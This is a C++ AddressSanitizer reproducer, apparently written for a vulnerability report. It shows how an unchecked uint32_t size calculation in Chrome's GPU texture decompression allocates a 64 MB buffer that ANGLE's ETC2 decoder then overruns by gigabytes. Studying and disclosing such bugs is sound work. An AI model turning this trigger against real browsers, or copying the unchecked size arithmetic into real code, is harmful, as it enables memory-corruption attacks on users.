// Real ASan reproducer using the ACTUAL ANGLE ETC2 decoder
// This is the exact code path Chrome's GPU process executes.
//
// Compile:
//   g++ -fsanitize=address -fno-omit-frame-pointer -g -O1 \
//       -std=c++17 \
//       -I/home/user/chromium-src/third_party/angle/src \
//       -I/home/user/chromium-src/third_party/angle/include \
//       real_asan_reproducer.cpp \
//       /home/user/chromium-src/third_party/angle/src/image_util/loadimage_etc.cpp \
//       /home/user/chromium-src/third_party/angle/src/image_util/loadimage.cpp \
//       /home/user/chromium-src/third_party/angle/src/image_util/imageformats.cpp \
//       -o real_asan_reproducer
//
// Run: ASAN_OPTIONS=halt_on_error=1 ./real_asan_reproducer

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <memory>
#include <limits>

// ANGLE real decoder
#include "image_util/loadimage.h"

namespace angle {
// Forward declare the real decoder used by Chrome
// Signature from loadimage.h line 1151
extern void LoadETC2RGBA8ToRGBA8(const ImageLoadContext&,
                                  size_t, size_t, size_t,
                                  const uint8_t*, size_t, size_t,
                                  uint8_t*, size_t, size_t);
}

// ── HeapArray mirrors base::HeapArray<uint8_t>::Uninit() exactly ─────────────
struct HeapArray {
    uint8_t* data_;
    size_t   size_;
    static HeapArray Uninit(size_t size) {
        if (!size) return {nullptr, 0};
        return {new uint8_t[size], size};
    }
    bool   empty() const { return size_ == 0; }
    uint8_t* data() { return data_; }
    ~HeapArray() { delete[] data_; }
};

// ── DecompressTextureData — verbatim port of gles2_cmd_decoder.cc:12619 ──────
static HeapArray DecompressTextureData(uint32_t width, uint32_t height, uint32_t depth) {
    const uint32_t output_pixel_size = 4;  // RGBA8: 4 bytes/pixel

    // ══ LINE 12629-12630: THE BUG ══
    // All four operands are uint32_t — product overflows silently
    auto decompressed_data = HeapArray::Uninit(
        output_pixel_size * width * height * depth);

    // ══ LINE 12991: empty() check — only catches overflow→0 ══
    if (decompressed_data.empty()) {
        printf("  [safe] overflow→0: empty() caught it ✓\n");
        return {nullptr, 0};
    }

    printf("  [VULN] Uninit(%u) → allocated %zu bytes  (should be %llu)\n",
           output_pixel_size * width * height * depth,
           decompressed_data.size_,
           (uint64_t)output_pixel_size * width * height * depth);
    printf("  [VULN] empty() = false → line 12991 check PASSES\n");
    printf("  [VULN] calling REAL angle::LoadETC2RGBA8ToRGBA8 ...\n\n");
    fflush(stdout);

    // ETC2 RGBA8: 16 bytes per 4x4 block
    size_t inputRowPitch   = ((width  + 3) / 4) * 16;
    size_t inputDepthPitch = ((height + 3) / 4) * inputRowPitch;

    // ══ LINES 12649-12650: also overflow in uint32_t ══
    size_t outputRowPitch   = (size_t)output_pixel_size * width;
    size_t outputDepthPitch = (size_t)output_pixel_size * width * height;

    // Compressed input — all zeros (valid ETC2 encoding for black)
    size_t compressed_size = inputDepthPitch * depth;
    printf("  Compressed input size: %zu bytes (%.1f MB)\n",
           compressed_size, (double)compressed_size / (1<<20));
    auto input = std::make_unique<uint8_t[]>(compressed_size);
    memset(input.get(), 0, compressed_size);

    angle::ImageLoadContext ctx{};

    // ══ HEAP BUFFER OVERFLOW HERE ══
    // output = 64 MB buffer, but outputDepthPitch * depth = 4 GB
    // The REAL ANGLE decoder walks every pixel and writes 4 bytes
    angle::LoadETC2RGBA8ToRGBA8(ctx,
        width, height, depth,
        input.get(), inputRowPitch, inputDepthPitch,
        decompressed_data.data(),   // ← 64 MB allocation
        outputRowPitch,             // ← 16384 bytes/row
        outputDepthPitch);          // ← 67,108,864 bytes/slice (uint32 overflow!)

    return decompressed_data;
}

int main() {
    printf("=== Finding 1: gles2_cmd_decoder.cc:12629 — REAL ANGLE decoder ===\n\n");

    const uint32_t W = 4096, H = 4096, D = 65;
    const uint32_t ops = 4;

    uint64_t true_size = (uint64_t)ops * W * H * D;
    uint32_t u32_size  = ops * W * H * D;  // overflows

    printf("Dimensions:    %u x %u x %u\n", W, H, D);
    printf("True bytes:    %llu  (%.2f GB)\n", (unsigned long long)true_size,
           (double)true_size/(1<<30));
    printf("uint32_t:      %u    (%.1f MB)  ← what Chrome allocates\n",
           u32_size, (double)u32_size/(1<<20));
    printf("empty() check: %s\n\n", u32_size ? "BYPASSED (non-zero)" : "caught");

    auto result = DecompressTextureData(W, H, D);
    printf("\nNo crash — ASan not triggered (unexpected)\n");
    return 0;
}
